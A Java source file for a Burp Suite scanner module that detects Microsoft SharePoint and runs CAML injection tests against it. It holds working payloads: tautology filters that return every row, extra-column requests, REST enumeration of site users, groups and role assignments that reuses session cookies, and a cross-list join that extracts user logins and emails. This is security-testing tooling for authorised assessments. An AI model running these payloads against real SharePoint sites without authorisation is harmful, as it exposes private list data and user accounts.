package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.*;
import com.omnistrike.model.*;

import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Pattern;

/**
 * MODULE: SharePoint CAML Injection Scanner
 *
 * This module CANNOT be manually triggered by the user. It is an active module
 * that passively gates on SharePoint indicators in responses. Only when
 * SharePoint is confirmed does it fire CAML injection payloads.
 *
 * Flow:
 *   1. Receives request/response via processHttpFlow() during active scanning
 *   2. Checks the RESPONSE body, URL, and headers for SharePoint indicators
 *   3. If NO SharePoint indicators -> returns empty (zero payloads sent)
 *   4. If SharePoint detected -> reports INFO finding, then injects CAML payloads
 *   5. Preserves original encoding (URL-encoded for REST API, raw XML for SOAP)
 *
 * Stop-scan: Respects ScanState.isCancelled() and Thread.isInterrupted().
 */
public class SharePointCAMLScanner implements ScanModule {

    private static final String MODULE_ID = "sharepoint-caml-scanner";

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;

    // -- SharePoint detection patterns (passive gate) -------------------------

    // Error messages that confirm SharePoint — only strong indicators
    // Removed: _layouts/ (Jekyll), GetListItems (generic SOAP), SharePoint\s+\d+ (marketing),
    //          _vti_bin/ (FrontPage FPSE), CAML.*error (OCaml), Microsoft.Office.Server (Office Online Server)
    private static final Pattern SP_ERROR_PATTERN = Pattern.compile(
            "Microsoft\\.SharePoint|"
                    + "SPException|"
                    + "SPListItem|"
                    + "\\bSPWeb\\b|"
                    + "\\bSPSite\\b|"
                    + "Invalid CAML|"
                    + "System\\.Runtime\\.InteropServices\\.COMException.*SharePoint|"
                    + "The attempted operation is prohibited because it exceeds the list view threshold",
            Pattern.CASE_INSENSITIVE);

    // URL patterns that strongly indicate SharePoint endpoints
    // Removed: /_layouts/ (Jekyll), /sites/ (generic), GetListItems (generic SOAP)
    private static final Pattern SP_URL_PATTERN = Pattern.compile(
            "/_api/web/|"
                    + "/_api/lists/|"
                    + "/_vti_bin/|"
                    + "sharepoint\\.com/|"
                    + "/_api/search/",
            Pattern.CASE_INSENSITIVE);

    // Response headers indicating SharePoint -- only truly SP-specific headers
    private static final Set<String> SP_HEADERS = Set.of(
            "sprequestguid", "x-sharepointhealthscore",
            "sprequestduration", "microsoftsharepointteamservices");

    // -- CAML injection payloads ----------------------------------------------

    // Phase 1: CAML Filter Injection -- tautology conditions to retrieve all rows
    private static final String[][] PHASE1_FILTER_INJECTION = {
            {"<Where><Geq><FieldRef Name='ID'/><Value Type='Number'>0</Value></Geq></Where>",
                    "ID >= 0 tautology"},
            {"<Where><IsNotNull><FieldRef Name='ID'/></IsNotNull></Where>",
                    "ID IsNotNull tautology"},
            {"<Where><Neq><FieldRef Name='ID'/><Value Type='Counter'>0</Value></Neq></Where>",
                    "ID != 0 negation tautology"},
            {"<Where><IsNotNull><FieldRef Name='Created'/></IsNotNull></Where>",
                    "Created IsNotNull tautology"},
    };

    // Phase 2: ViewFields Expansion -- request extra columns not in baseline
    private static final String VIEWFIELDS_EXPANSION =
            "<ViewFields><FieldRef Name='Author'/><FieldRef Name='Editor'/>"
                    + "<FieldRef Name='Created'/><FieldRef Name='Modified'/></ViewFields>";

    private static final Set<String> VIEWFIELDS_MARKERS = Set.of(
            "Author", "Editor", "Created", "Modified");

    // Phase 3: List Enumeration -- REST API probes for site metadata
    private static final String[][] PHASE3_ENUMERATION_ENDPOINTS = {
            {"/_api/web/lists?$select=Title,ItemCount,Hidden", "list enumeration"},
            {"/_api/web/sitegroups", "site groups enumeration"},
            {"/_api/web/siteusers", "site users enumeration"},
            {"/_api/web/roleassignments", "role assignments enumeration"},
    };

    // SharePoint-specific OData markers expected in REST responses
    private static final Set<String> SP_ODATA_MARKERS = Set.of(
            "odata.metadata", "Title", "Id");

    // Phase 4: Cross-List Data Access -- CAML Joins + ProjectedFields to pull data from related lists
    private static final String CROSS_LIST_JOIN =
            "<Joins><Join Type='LEFT' ListAlias='Users'>"
                    + "<Eq><FieldRef Name='Author' RefType='Id'/>"
                    + "<FieldRef List='Users' Name='ID'/></Eq>"
                    + "</Join></Joins>"
                    + "<ProjectedFields>"
                    + "<Field Name='UserLogin' Type='Lookup' List='Users' ShowField='Name'/>"
                    + "<Field Name='UserEmail' Type='Lookup' List='Users' ShowField='EMail'/>"
                    + "</ProjectedFields>";

    // -- Encoding detection ---------------------------------------------------

    // CAML parameter name hints
    private static final Set<String> CAML_PARAM_NAMES = Set.of(
            "query", "caml", "viewxml", "querytext", "camlquery",
            "querystring", "$filter", "listid");

    // CAML XML content markers in decoded parameter values
    private static final Pattern CAML_CONTENT_PATTERN = Pattern.compile(
            "<Where>|<Query>|<View>|<OrderBy>|<ViewFields>",
            Pattern.CASE_INSENSITIVE);

    // -- ScanModule interface -------------------------------------------------

    @Override public String getId() { return MODULE_ID; }
    @Override public String getName() { return "SharePoint CAML Injection"; }
    @Override public String getDescription() {
        return "Detects Microsoft SharePoint and tests for CAML injection. "
                + "Only activates when SharePoint indicators are detected in responses.";
    }
    @Override public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
    @Override public boolean isPassive() { return false; } // Active module with passive gate

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        // collaboratorManager not used -- no OOB needed for CAML injection
    }

    @Override public void destroy() {}

    // -- Main entry point -----------------------------------------------------

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String urlPath = extractPath(url);

        // PASSIVE GATE: Check response for SharePoint indicators
        SPDetection detection = detectSharePoint(requestResponse);
        if (detection == null) return Collections.emptyList();

        // SharePoint confirmed -- report INFO finding
        if (dedup.markIfNew(MODULE_ID, urlPath, "sp-detected")) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Microsoft SharePoint Detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence(detection.evidence)
                    .description("The target application is running Microsoft SharePoint. "
                            + "CAML injection testing will be performed automatically.")
                    .requestResponse(requestResponse)
                    .build());
            api.logging().logToOutput("[SharePoint] SharePoint detected: " + url + " | " + detection.evidence);
        }

        // ACTIVE ATTACK: Inject CAML payloads
        try {
            testCamlInjection(requestResponse, detection, url, urlPath);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return Collections.emptyList();
    }

    // -- SharePoint Detection (passive gate) ----------------------------------

    private SPDetection detectSharePoint(HttpRequestResponse reqResp) {
        String body = reqResp.response().bodyToString();
        if (body == null) body = "";
        String url = reqResp.request().url();

        // Check 1: Error messages in response body (strongest signal -- standalone)
        if (SP_ERROR_PATTERN.matcher(body).find()) {
            return new SPDetection("SharePoint error pattern in response body",
                    extractListNameFromError(body));
        }

        // Check 2: URL pattern + SP-specific header (require both)
        if (SP_URL_PATTERN.matcher(url).find()) {
            for (var h : reqResp.response().headers()) {
                if (SP_HEADERS.contains(h.name().toLowerCase())) {
                    return new SPDetection(
                            "SharePoint URL pattern (" + url + ") + header: " + h.name(),
                            extractListNameFromUrl(url));
                }
            }
        }

        return null; // No SharePoint detected -- module stays dormant
    }

    // -- Active CAML Injection Testing ----------------------------------------

    private void testCamlInjection(HttpRequestResponse original, SPDetection detection,
                                    String url, String urlPath) throws InterruptedException {
        HttpRequest request = original.request();

        // Find the injectable parameter(s) -- prioritize CAML-like parameters
        List<InjectableParam> targets = identifyTargets(request);
        if (targets.isEmpty()) return;

        for (InjectableParam target : targets) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            if (!dedup.markIfNew(MODULE_ID, urlPath, target.name)) continue;

            api.logging().logToOutput("[SharePoint] Testing parameter '" + target.name
                    + "' (encoding: " + target.encoding + ") on " + url);

            // Phase 1: CAML Filter Injection
            testFilterInjection(original, target, url);

            // Phase 2: ViewFields Expansion
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testViewFieldsExpansion(original, target, url);

            // Phase 3: List Enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testListEnumeration(original, url, urlPath);

            // Phase 4: Cross-List Data Access
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testCrossListAccess(original, target, url);
        }
    }

    // -- Phase 1: CAML Filter Injection ---------------------------------------

    private void testFilterInjection(HttpRequestResponse original, InjectableParam target,
                                      String url) throws InterruptedException {
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Count baseline rows using common SharePoint response row markers
        int baselineRows = countRows(baselineBody);

        for (String[] entry : PHASE1_FILTER_INJECTION) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String filterPayload = entry[0];
            String technique = entry[1];

            // Inject the tautology filter into the original CAML value
            String injected = injectCamlFilter(target.decodedValue, filterPayload);
            if (injected == null) {
                // If we cannot inject into existing CAML, use payload directly
                injected = filterPayload;
            }

            HttpRequestResponse result = sendPayload(original, target, injected);
            if (result == null || result.response() == null) { perHostDelay(); continue; }
            if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String resultBody = result.response().bodyToString();
            if (resultBody == null) resultBody = "";

            // Check: more rows returned (filter was bypassed)
            int resultRows = countRows(resultBody);

            if (resultRows > baselineRows + 2
                    && result.response().statusCode() == 200
                    && !resultBody.equals(baselineBody)) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "SharePoint CAML Filter Injection -- " + technique,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Injected tautology CAML filter returned " + resultRows
                                + " rows vs baseline " + baselineRows + " rows. "
                                + "Filter condition was bypassed.")
                        .payload(injected)
                        .requestResponse(result)
                        .build());
                return; // One confirmed finding per phase
            }
            perHostDelay();
        }
    }

    // -- Phase 2: ViewFields Expansion ----------------------------------------

    private void testViewFieldsExpansion(HttpRequestResponse original, InjectableParam target,
                                          String url) throws InterruptedException {
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Inject ViewFields expansion into the existing CAML value
        String injected = injectViewFields(target.decodedValue, VIEWFIELDS_EXPANSION);
        if (injected == null) {
            // If we cannot inject into existing CAML, use payload directly
            injected = VIEWFIELDS_EXPANSION;
        }

        HttpRequestResponse result = sendPayload(original, target, injected);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check: new field names appeared in response that were not in baseline
        // Use JSON key format ("Author":) to avoid matching common English words
        int newFieldCount = 0;
        for (String marker : VIEWFIELDS_MARKERS) {
            String jsonKey = "\"" + marker + "\"";
            if (resultBody.contains(jsonKey) && !baselineBody.contains(jsonKey)) {
                newFieldCount++;
            }
        }

        if (newFieldCount >= 2 && result.response().statusCode() == 200) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "SharePoint CAML ViewFields Expansion -- " + newFieldCount + " extra columns",
                            Severity.HIGH, Confidence.FIRM)
                    .url(url).parameter(target.name)
                    .evidence("Injected ViewFields expansion returned " + newFieldCount
                            + " additional field names (Author, Editor, Created, Modified) "
                            + "not present in baseline response.")
                    .payload(injected)
                    .requestResponse(result)
                    .build());
        }
        perHostDelay();
    }

    // -- Phase 3: List Enumeration --------------------------------------------

    private void testListEnumeration(HttpRequestResponse original, String url,
                                      String urlPath) throws InterruptedException {
        // Only proceed if the URL contains /_api/ (REST API endpoint)
        if (!url.toLowerCase().contains("/_api/")) {
            perHostDelay();
            return;
        }

        if (!dedup.markIfNew(MODULE_ID, urlPath, "list-enum")) {
            perHostDelay();
            return;
        }

        // Differential probe: two different endpoints must produce different responses
        // to confirm the target actually processes our REST requests differently.
        if (PHASE3_ENUMERATION_ENDPOINTS.length < 2) { perHostDelay(); return; }

        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        // Extract base URL (scheme + host)
        String baseUrl = extractBaseUrl(url);
        if (baseUrl == null) { perHostDelay(); return; }

        HttpRequestResponse resultA = sendProbeRequest(original, baseUrl + PHASE3_ENUMERATION_ENDPOINTS[0][0]);
        perHostDelay();
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        HttpRequestResponse resultB = sendProbeRequest(original, baseUrl + PHASE3_ENUMERATION_ENDPOINTS[1][0]);
        perHostDelay();

        if (resultA == null || resultA.response() == null || resultB == null || resultB.response() == null) return;

        String bodyA = resultA.response().bodyToString();
        String bodyB = resultB.response().bodyToString();
        if (bodyA == null) bodyA = "";
        if (bodyB == null) bodyB = "";

        // If both probes produce identical responses, the target is not processing them differently
        if (bodyA.equals(bodyB)) {
            api.logging().logToOutput("[SharePoint] List enumeration: differential probe failed -- "
                    + "both endpoints returned identical responses. Skipping.");
            return;
        }

        // Now probe all enumeration endpoints
        for (String[] entry : PHASE3_ENUMERATION_ENDPOINTS) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

            String endpoint = entry[0];
            String technique = entry[1];

            HttpRequestResponse result = sendProbeRequest(original, baseUrl + endpoint);
            if (result == null || result.response() == null) { perHostDelay(); continue; }
            if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); continue; }
            if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body == null) body = "";

            // Require SharePoint-specific OData response markers
            int markerCount = 0;
            for (String marker : SP_ODATA_MARKERS) {
                if (body.contains("\"" + marker + "\"")) {
                    markerCount++;
                }
            }

            // Require odata.metadata (SP-specific) as one of the markers — "Title"/"Id" alone are too generic
            boolean hasOdataMetadata = body.contains("\"odata.metadata\"");
            if (markerCount >= 2 && hasOdataMetadata && result.response().statusCode() == 200 && body.length() > 50) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "SharePoint List Enumeration -- " + technique,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(baseUrl + endpoint)
                        .evidence("SharePoint REST API endpoint '" + endpoint + "' returned data with "
                                + markerCount + " OData markers. "
                                + "Differential probe confirmed distinct responses for different endpoints. "
                                + "Response length: " + body.length() + " bytes.")
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    // -- Phase 4: Cross-List Data Access --------------------------------------

    private void testCrossListAccess(HttpRequestResponse original, InjectableParam target,
                                      String url) throws InterruptedException {
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;

        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Inject the cross-list join into the existing CAML value
        String injected = injectJoinIntoValue(target.decodedValue, CROSS_LIST_JOIN);
        if (injected == null) {
            // If we cannot inject into existing CAML, use payload directly
            injected = CROSS_LIST_JOIN;
        }

        HttpRequestResponse result = sendPayload(original, target, injected);
        if (result == null || result.response() == null) { perHostDelay(); return; }
        if (result.response().statusCode() >= 400 && result.response().statusCode() < 500) { perHostDelay(); return; }
        if (!ResponseGuard.isUsableResponse(result)) { perHostDelay(); return; }

        String resultBody = result.response().bodyToString();
        if (resultBody == null) resultBody = "";

        // Check: new JSON keys from joined list appeared in response
        int newKeyCount = countNewJsonKeys(baselineBody, resultBody);

        if (newKeyCount >= 2
                && result.response().statusCode() == 200
                && !resultBody.equals(baselineBody)) {

            // Check for projected field names from our CROSS_LIST_JOIN payload (must be new vs baseline)
            boolean hasProjectedFields = (resultBody.contains("\"UserLogin\"")
                        && !baselineBody.contains("\"UserLogin\""))
                    || (resultBody.contains("\"UserEmail\"")
                        && !baselineBody.contains("\"UserEmail\""));
            // Also check for SP-specific user data in JSON key format (not bare substrings)
            boolean hasUserData = (resultBody.contains("\"LoginName\"")
                        && !baselineBody.contains("\"LoginName\""))
                    || (resultBody.contains("\"UserPrincipalName\"")
                        && !baselineBody.contains("\"UserPrincipalName\""))
                    || (resultBody.contains("\"EMail\"")
                        && !baselineBody.contains("\"EMail\""));

            // Require projected fields or user data evidence — generic key count alone is not enough
            if (hasProjectedFields || hasUserData) {
                findingsStore.addFinding(Finding.builder(MODULE_ID,
                                "SharePoint CAML Cross-List Data Access",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(target.name)
                        .evidence("Injected CAML Joins element with LEFT join to 'Users' list "
                                + "returned " + newKeyCount + " new JSON keys not in baseline. "
                                + "Cross-list data access confirmed.")
                        .payload(injected)
                        .requestResponse(result)
                        .build());
            }
        }
        perHostDelay();
    }

    // -- Target Identification ------------------------------------------------

    private List<InjectableParam> identifyTargets(HttpRequest request) {
        List<InjectableParam> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            String name = param.name().toLowerCase();
            String value = param.value();
            if (value == null || value.isEmpty()) continue;

            // Detect encoding
            Encoding encoding = detectEncoding(value);
            String decoded = decode(value, encoding);

            // Priority 1: Parameter value contains CAML XML content
            if (decoded != null && CAML_CONTENT_PATTERN.matcher(decoded).find()) {
                targets.add(0, new InjectableParam(param.name(), value, decoded,
                        param.type(), encoding, true));
                continue;
            }

            // Priority 2: Parameter name suggests CAML
            if (CAML_PARAM_NAMES.contains(name)) {
                targets.add(new InjectableParam(param.name(), value, decoded,
                        param.type(), encoding, false));
            }
        }

        // Also check if the URL contains /_api/web/lists/ -- REST list query endpoint
        // In that case, any XML-like body parameter is a candidate
        String url = request.url().toLowerCase();
        if (url.contains("/_api/web/lists/") && targets.isEmpty()) {
            for (var param : request.parameters()) {
                String value = param.value();
                if (value == null || value.isEmpty()) continue;
                Encoding encoding = detectEncoding(value);
                String decoded = decode(value, encoding);
                if (decoded != null && (decoded.contains("<") || decoded.contains("&lt;"))) {
                    targets.add(new InjectableParam(param.name(), value, decoded,
                            param.type(), encoding, false));
                }
            }
        }

        // If no specific targets found, don't test random parameters
        // CAML injection only makes sense on CAML-carrying parameters
        return targets;
    }

    // -- Encoding Detection & Preservation ------------------------------------

    private enum Encoding { RAW, URL_ENCODED, DOUBLE_URL_ENCODED }

    private Encoding detectEncoding(String value) {
        if (value == null) return Encoding.RAW;

        // Double URL-encoded: contains %25xx
        if (value.contains("%253C") || value.contains("%2526")) {
            return Encoding.DOUBLE_URL_ENCODED;
        }

        // URL-encoded: contains %3C (%xx patterns)
        if (value.contains("%3C") || value.contains("%3c") || value.contains("%26")
                || value.contains("%3E") || value.contains("%3e")) {
            return Encoding.URL_ENCODED;
        }

        return Encoding.RAW;
    }

    private String decode(String value, Encoding encoding) {
        if (value == null) return null;
        try {
            switch (encoding) {
                case URL_ENCODED:
                    return java.net.URLDecoder.decode(value, StandardCharsets.UTF_8);
                case DOUBLE_URL_ENCODED:
                    String single = java.net.URLDecoder.decode(value, StandardCharsets.UTF_8);
                    return java.net.URLDecoder.decode(single, StandardCharsets.UTF_8);
                default:
                    return value;
            }
        } catch (Exception e) {
            return value;
        }
    }

    private String encode(String payload, Encoding encoding) {
        if (payload == null) return null;
        try {
            switch (encoding) {
                case URL_ENCODED:
                    // Montoya's withUpdatedParameters() handles URL encoding internally,
                    // so return the raw payload to avoid double-encoding.
                    return payload;
                case DOUBLE_URL_ENCODED:
                    // Montoya adds one layer of URL encoding, so we encode once here
                    // and let Montoya apply the second layer.
                    return java.net.URLEncoder.encode(payload, StandardCharsets.UTF_8);
                default:
                    return payload;
            }
        } catch (Exception e) {
            return payload;
        }
    }

    // -- HTTP Request Sending -------------------------------------------------

    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectableParam target,
                                             String camlPayload) {
        if (ScanState.isCancelled()) return null;

        // Encode the payload to match the original parameter's encoding
        String encoded = encode(camlPayload, target.encoding);

        try {
            HttpRequest modified;
            switch (target.paramType) {
                case URL:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, encoded));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, encoded));
                    break;
                default:
                    return null;
            }

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    /**
     * Send a GET probe request to a specific URL, copying headers from the original request.
     * Used for Phase 3 list enumeration probes.
     */
    private HttpRequestResponse sendProbeRequest(HttpRequestResponse original, String probeUrl) {
        if (ScanState.isCancelled()) return null;

        try {
            // Build a GET request to the probe URL with the same host and headers
            HttpRequest probeRequest = HttpRequest.httpRequestFromUrl(probeUrl);

            // Copy authentication headers from original request
            for (var header : original.request().headers()) {
                String name = header.name().toLowerCase();
                if (name.equals("cookie") || name.equals("authorization")
                        || name.equals("x-requestdigest") || name.equals("x-csrf-token")) {
                    probeRequest = probeRequest.withAddedHeader(header.name(), header.value());
                }
            }

            // Add Accept header for JSON
            probeRequest = probeRequest.withRemovedHeader("Accept")
                    .withAddedHeader("Accept", "application/json;odata=verbose");

            HttpRequestResponse result = api.http().sendRequest(probeRequest);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    // -- CAML Manipulation Helpers --------------------------------------------

    /**
     * Inject a CAML filter (Where clause) into an existing CAML value.
     * Looks for existing View/Query elements to inject into, or wraps the filter.
     */
    private String injectCamlFilter(String decodedValue, String filterPayload) {
        if (decodedValue == null) return null;

        // If the value already contains a <Query> element, inject inside it
        int queryClose = decodedValue.indexOf("</Query>");
        if (queryClose >= 0) {
            // Replace existing <Where> content or inject before </Query>
            int whereStart = decodedValue.indexOf("<Where>");
            int whereEnd = decodedValue.indexOf("</Where>");
            if (whereStart >= 0 && whereEnd >= 0 && whereStart < queryClose) {
                // Replace existing Where clause
                return decodedValue.substring(0, whereStart)
                        + filterPayload
                        + decodedValue.substring(whereEnd + "</Where>".length());
            }
            // No existing Where -- inject before </Query>
            return decodedValue.substring(0, queryClose)
                    + filterPayload
                    + decodedValue.substring(queryClose);
        }

        // If the value contains a <View> element, inject <Query> inside it
        int viewClose = decodedValue.indexOf("</View>");
        if (viewClose >= 0) {
            return decodedValue.substring(0, viewClose)
                    + "<Query>" + filterPayload + "</Query>"
                    + decodedValue.substring(viewClose);
        }

        // If the value is bare CAML without View/Query wrapper, wrap it
        if (decodedValue.contains("<") && decodedValue.trim().startsWith("<")) {
            return "<Query>" + filterPayload + "</Query>";
        }

        return null;
    }

    /**
     * Inject ViewFields expansion into an existing CAML value.
     */
    private String injectViewFields(String decodedValue, String viewFieldsPayload) {
        if (decodedValue == null) return null;

        // If the value contains a <View> element, inject before </View>
        int viewClose = decodedValue.indexOf("</View>");
        if (viewClose >= 0) {
            // Remove existing <ViewFields> if present
            String cleaned = decodedValue.replaceAll("<ViewFields>.*?</ViewFields>", "");
            viewClose = cleaned.indexOf("</View>");
            if (viewClose >= 0) {
                return cleaned.substring(0, viewClose)
                        + viewFieldsPayload
                        + cleaned.substring(viewClose);
            }
        }

        // If the value contains a <Query> element, wrap with <View>
        if (decodedValue.contains("<Query>") || decodedValue.contains("<Where>")) {
            return "<View>" + viewFieldsPayload + decodedValue + "</View>";
        }

        // Bare CAML -- wrap in View
        if (decodedValue.contains("<") && decodedValue.trim().startsWith("<")) {
            return "<View>" + viewFieldsPayload + decodedValue + "</View>";
        }

        return null;
    }

    /**
     * Inject a Joins element into an existing CAML value.
     */
    private String injectJoinIntoValue(String decodedValue, String joinPayload) {
        if (decodedValue == null) return null;

        // If the value contains a <View> element, inject before </View>
        int viewClose = decodedValue.indexOf("</View>");
        if (viewClose >= 0) {
            return decodedValue.substring(0, viewClose)
                    + joinPayload
                    + decodedValue.substring(viewClose);
        }

        // If the value contains a <Query> element, wrap with <View>
        if (decodedValue.contains("<Query>") || decodedValue.contains("<Where>")) {
            return "<View>" + decodedValue + joinPayload + "</View>";
        }

        // Bare CAML -- wrap in View with join
        if (decodedValue.contains("<") && decodedValue.trim().startsWith("<")) {
            return "<View>" + decodedValue + joinPayload + "</View>";
        }

        return null;
    }

    // -- List Name / Entity Extraction ----------------------------------------

    private String extractListNameFromError(String body) {
        // Try to find list name from SharePoint error messages
        Pattern listPattern = Pattern.compile(
                "list '([^']+)'|List: ([\\w\\s]+)|"
                        + "GetListItems.*?listName=\"([^\"]+)\"|"
                        + "SPList.*?'([^']+)'",
                Pattern.CASE_INSENSITIVE);
        var matcher = listPattern.matcher(body);
        if (matcher.find()) {
            for (int i = 1; i <= matcher.groupCount(); i++) {
                if (matcher.group(i) != null) return matcher.group(i);
            }
        }
        return null;
    }

    private String extractListNameFromUrl(String url) {
        // Extract list name from REST URL like /_api/web/lists/getbytitle('Documents')/items
        Pattern pattern = Pattern.compile(
                "getbytitle\\('([^']+)'\\)|"
                        + "getbyid\\('([^']+)'\\)|"
                        + "/lists/([^/\\?]+)",
                Pattern.CASE_INSENSITIVE);
        var matcher = pattern.matcher(url);
        if (matcher.find()) {
            for (int i = 1; i <= matcher.groupCount(); i++) {
                if (matcher.group(i) != null) return matcher.group(i);
            }
        }
        return null;
    }

    // -- Utility Methods ------------------------------------------------------

    /**
     * Count rows in a SharePoint response using common row markers.
     * Checks for OData entities, list item markers, and XML row elements.
     */
    private int countRows(String body) {
        int count = 0;
        // OData JSON format: "__metadata" or "odata.type" per item
        count = Math.max(count, countOccurrences(body, "\"__metadata\""));
        count = Math.max(count, countOccurrences(body, "\"odata.type\""));
        // REST JSON format: "Id" keys (common in list item responses)
        int idCount = countOccurrences(body, "\"Id\"");
        if (idCount > count) count = idCount;
        // XML/SOAP format: <z:row elements
        int xmlRows = countOccurrences(body, "<z:row");
        if (xmlRows > count) count = xmlRows;
        // Atom format: <entry> elements
        int atomRows = countOccurrences(body, "<entry>");
        if (atomRows > count) count = atomRows;
        return count;
    }

    private int countNewJsonKeys(String baseline, String result) {
        // Count JSON keys in result that don't appear in baseline
        Pattern keyPattern = Pattern.compile("\"(\\w+)\"\\s*:");
        Set<String> baselineKeys = new HashSet<>();
        var bm = keyPattern.matcher(baseline);
        while (bm.find()) baselineKeys.add(bm.group(1));

        Set<String> newKeys = new HashSet<>();
        var rm = keyPattern.matcher(result);
        while (rm.find()) {
            if (!baselineKeys.contains(rm.group(1))) newKeys.add(rm.group(1));
        }
        return newKeys.size();
    }

    private int countOccurrences(String text, String search) {
        int count = 0, idx = 0;
        while ((idx = text.indexOf(search, idx)) >= 0) { count++; idx += search.length(); }
        return count;
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("sharepoint.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private String extractPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) { int q = url.indexOf('?', s + 3); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Extract the base URL (scheme + host + port) from a full URL.
     * E.g., "https://sharepoint.example.com/sites/team/_api/web/lists" -> "https://sharepoint.example.com"
     */
    private String extractBaseUrl(String url) {
        try {
            int schemeEnd = url.indexOf("://");
            if (schemeEnd < 0) return null;
            int pathStart = url.indexOf('/', schemeEnd + 3);
            if (pathStart < 0) return url;
            return url.substring(0, pathStart);
        } catch (Exception ignored) {}
        return null;
    }

    // -- Inner classes --------------------------------------------------------

    private static class SPDetection {
        final String evidence;
        final String listName;
        SPDetection(String evidence, String listName) {
            this.evidence = evidence;
            this.listName = listName;
        }
    }

    private static class InjectableParam {
        final String name;
        final String originalValue;
        final String decodedValue;
        final HttpParameterType paramType;
        final Encoding encoding;
        final boolean isCaml; // true if the value actually contains CAML XML

        InjectableParam(String name, String originalValue, String decodedValue,
                         HttpParameterType paramType, Encoding encoding, boolean isCaml) {
            this.name = name;
            this.originalValue = originalValue;
            this.decodedValue = decodedValue;
            this.paramType = paramType;
            this.encoding = encoding;
            this.isCaml = isCaml;
        }
    }
}
